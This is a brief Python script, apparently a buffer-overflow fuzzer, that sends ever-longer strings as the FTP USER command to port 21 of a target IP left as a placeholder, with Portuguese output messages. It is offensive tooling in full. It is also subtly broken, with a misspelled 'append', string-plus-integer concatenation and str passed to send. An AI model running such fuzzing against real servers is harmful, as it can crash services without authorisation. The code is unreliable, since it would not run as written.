#!/usr/bin/python
import socket


buffer=["A"]
contador = 100

while len(buffer) <= 25:
    buffer.apped("A"+contador)
    contador=contador+200


for string in buffer:
    print(f"Fuzzing FTP USER com {len(string)} bytes")
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(("Digite o ip", 21))
    s.send("USER "+string+"\r\n")

